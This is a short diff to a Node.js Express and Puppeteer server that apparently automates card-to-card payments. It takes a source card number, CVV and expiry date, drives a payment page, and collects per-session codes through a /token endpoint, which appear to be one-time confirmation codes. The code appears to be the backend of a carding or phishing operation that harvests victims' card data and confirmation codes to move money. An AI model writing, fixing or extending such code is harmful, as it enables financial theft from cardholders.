@@ -79,7 +79,7 @@ const write_data = async (toCard, amount, fromCard,cvv, expireDate, email, id) =
       await page.screenshot({path: 'try1.png'})
     } catch (e) {
       await page.screenshot({path: 'try0.png'})
-      if(!!(await page.$x('//*[contains(text(), "Ошибка платежа")]')).length) return 1
+      if(!!(await page.$x('//*[contains(text(), "Ошибка платежа")]')).length) return 0
     }
 
     await page.waitForTimeout(5000);
@@ -136,8 +136,8 @@ app.post('/sendData', async (req, res) => {
 
 app.get('/token/:id/:code', async (req, res) => {
   const {id, code} = req.params
-  obj[id] = code
-  return res.status(200).json({ok: await id_res[id],id})
+  if(code) obj[id] = code
+  return res.status(200).json({ok: await id_res[id], id})
 })
 
 app.listen(5000)
